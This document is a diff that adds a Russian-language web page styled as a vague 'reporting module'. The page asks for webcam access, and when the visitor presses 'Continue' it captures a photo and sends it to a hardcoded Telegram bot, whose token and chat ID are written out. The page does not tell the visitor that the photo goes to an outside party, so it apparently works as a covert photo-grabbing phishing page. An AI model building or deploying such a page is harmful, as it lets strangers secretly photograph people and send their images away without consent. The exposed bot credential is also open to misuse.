@@ -1,0 +1,339 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Модуль веб-съёмки и отчётности</title>
+
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+        }
+
+        body {
+            background: #0f172a;
+            color: white;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .app-card {
+            background: #1e293b;
+            width: 100%;
+            max-width: 600px;
+            border-radius: 20px;
+            padding: 25px;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.4);
+            border: 1px solid #334155;
+            text-align: center;
+        }
+
+        .app-title {
+            font-size: 28px;
+            margin-bottom: 10px;
+            color: #38bdf8;
+        }
+
+        .app-subtitle {
+            font-size: 16px;
+            color: #94a3b8;
+            margin-bottom: 20px;
+        }
+
+        .video-container {
+            position: relative;
+            width: 100%;
+            background: #000;
+            border-radius: 15px;
+            overflow: hidden;
+            border: 2px solid #475569;
+            aspect-ratio: 4 / 3;
+            margin-bottom: 20px;
+        }
+
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .btn-submit {
+            width: 100%;
+            padding: 15px 20px;
+            font-size: 18px;
+            font-weight: bold;
+            color: white;
+            background: #2563eb;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            transition: 0.2s;
+        }
+
+        .btn-submit:hover {
+            background: #1d4ed8;
+        }
+
+        .btn-submit:disabled {
+            background: #64748b;
+            cursor: not-allowed;
+        }
+
+        .status-message {
+            margin-top: 15px;
+            font-size: 15px;
+            color: #94a3b8;
+        }
+
+        @media (max-width: 480px) {
+            .app-card {
+                padding: 18px;
+            }
+
+            .app-title {
+                font-size: 23px;
+            }
+
+            .app-subtitle {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+
+<div class="app-card">
+
+    <h1 class="app-title">
+        Модуль отчётности
+    </h1>
+
+   <p class="app-subtitle">
+    Нажмите «Продолжить», чтобы начать
+</p>
+    </p>
+
+    <div class="video-container">
+        <video id="webcam" autoplay playsinline></video>
+    </div>
+
+    <button id="snap" class="btn-submit">
+        📸 Продолжить
+    </button>
+
+    <div id="status" class="status-message">
+        Запуск камеры...
+    </div>
+
+    <canvas
+        id="canvas"
+        width="640"
+        height="480"
+        style="display:none;">
+    </canvas>
+
+</div>
+
+<script>
+
+// ==============================
+// TELEGRAM
+// ==============================
+
+const BOT_TOKEN = "8922731294:AAG693btdaZE7ff5M42z8wGENhcmyHohXn0";
+const CHAT_ID = "7796158143";
+
+
+// ==============================
+// ЭЛЕМЕНТЫ
+// ==============================
+
+const video = document.getElementById("webcam");
+const canvas = document.getElementById("canvas");
+const snapBtn = document.getElementById("snap");
+const statusText = document.getElementById("status");
+
+
+// ==============================
+// ЗАПУСК КАМЕРЫ
+// ==============================
+
+async function startCamera() {
+
+    if (!navigator.mediaDevices ||
+        !navigator.mediaDevices.getUserMedia) {
+
+        statusText.innerText =
+            "❌ Этот браузер не поддерживает камеру.";
+
+        snapBtn.disabled = true;
+        return;
+    }
+
+    try {
+
+        const stream =
+            await navigator.mediaDevices.getUserMedia({
+                video: true,
+                audio: false
+            });
+
+        video.srcObject = stream;
+
+        statusText.innerText =
+            "Камера готова. Нажмите «Продолжить».";
+
+    } catch (error) {
+
+        console.error(error);
+
+        statusText.innerText =
+            "❌ Доступ к камере не разрешён.";
+
+        snapBtn.disabled = true;
+    }
+}
+
+
+// ==============================
+// ФОТО
+// ==============================
+
+snapBtn.addEventListener("click", function () {
+
+    if (!video.srcObject) {
+        statusText.innerText =
+            "❌ Камера не запущена.";
+        return;
+    }
+
+    statusText.innerText =
+        "Создание фотографии...";
+
+    snapBtn.disabled = true;
+
+    const context = canvas.getContext("2d");
+
+    context.drawImage(
+        video,
+        0,
+        0,
+        canvas.width,
+        canvas.height
+    );
+
+
+    // ==============================
+    // ПРЕОБРАЗОВАНИЕ В JPEG
+    // ==============================
+
+    canvas.toBlob(async function (blob) {
+
+        if (!blob) {
+
+            statusText.innerText =
+                "❌ Ошибка создания фотографии.";
+
+            snapBtn.disabled = false;
+            return;
+        }
+
+
+        // ==============================
+        // ПРОВЕРКА TELEGRAM ДАННЫХ
+        // ==============================
+
+        if (!BOT_TOKEN || !CHAT_ID) {
+
+            statusText.innerText =
+                "✅ Фотография создана.";
+
+            snapBtn.disabled = false;
+            return;
+        }
+
+
+        // ==============================
+        // ОТПРАВКА В TELEGRAM
+        // ==============================
+
+        const formData = new FormData();
+
+        formData.append(
+            "chat_id",
+            CHAT_ID
+        );
+
+        formData.append(
+            "photo",
+            blob,
+            "photo.jpg"
+        );
+
+
+        try {
+
+            statusText.innerText =
+                "Отправка фотографии...";
+
+            const response =
+                await fetch(
+                    `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
+                    {
+                        method: "POST",
+                        body: formData
+                    }
+                );
+
+            const data =
+                await response.json();
+
+
+            if (data.ok) {
+
+                statusText.innerText =
+                    "✅ Фотография отправлена!";
+
+            } else {
+
+                statusText.innerText =
+                    "❌ Telegram не принял фотографию.";
+
+                console.error(data);
+            }
+
+        } catch (error) {
+
+            console.error(error);
+
+            statusText.innerText =
+                "❌ Ошибка соединения с Telegram.";
+
+        } finally {
+
+            snapBtn.disabled = false;
+        }
+
+    }, "image/jpeg", 0.85);
+
+});
+
+
+// ==============================
+// ЗАПУСК
+// ==============================
+
+startCamera();
+
+</script>
+
+</body>
+</html>
